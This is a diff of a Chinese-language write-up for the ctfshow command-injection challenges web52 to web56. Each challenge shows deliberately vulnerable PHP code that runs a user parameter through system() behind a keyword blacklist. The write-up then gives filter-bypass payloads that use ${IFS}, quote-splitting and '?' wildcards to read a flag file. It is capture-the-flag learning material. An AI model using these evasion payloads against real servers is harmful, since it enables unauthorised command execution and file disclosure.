@@ -1282,7 +1282,7 @@ if(isset($_GET['c'])){
 
 payload:?c=nl<fl''ag.php||
 
-成功自行构造出官解，然而环境好像出问题了，flag出不来，难怪这题wp全是空的。
+成功自行构造出官解，然而记得看源代码，这题没有回显。
 
 
 
@@ -1327,6 +1327,158 @@ if(isset($_GET['c'])){
 payload：?c=nl$IFS/fl%27%27ag||
 
 为什么不要php，没搞懂。
+
+
+
+### web53
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 18:21:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+        echo($c);
+        $d = system($c);
+        echo "<br>".$d;
+    }else{
+        echo 'no';
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+<br>空标签，意味着换行。也就是说会出现原指令的名字。
+
+?c=ls查看发现有flag.php和readflag？
+
+都尝试打开试试
+
+?c=t''ac${IFS}fla''g.p''hp
+
+
+
+### web54
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 19:43:42
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤了很多命令。中间这些个很多的星号的内容，其实是说，含有cat,more这样的会被匹配，如cat 那么ca323390ft或c232fa3kdfst, 凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。只能把全路径写出来，如/bin/ca?,与/bin/ca?匹配的，只有/bin/cat命令，这样就用到了cat 命令了。
+
+空格依旧用${IFS}代替。先ls查看一下，发现目标文件flag.php
+
+然后构建查看flag.php的payload：?c=/bin/?at${IFS}f???????
+
+请注意，它只是执行了但没有回显结果，需要自己看源代码
+
+
+
+### web55
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 20:03:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。
+
+但因为字母不能传入，我们需要使用通配符?来进行代替
+
+?c=/bin/base64 flag.php
+
+替换后变成
+
+?c=/???/????64 ????.???
+
+谜语人滚出CTF！
+
+还真的得到了base64编码，但这种纯靠猜的题目建议扔秦岭喂大熊猫
+
+
+
+### web56(未完成)
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+它这次把数字也过滤了……
 
 
 
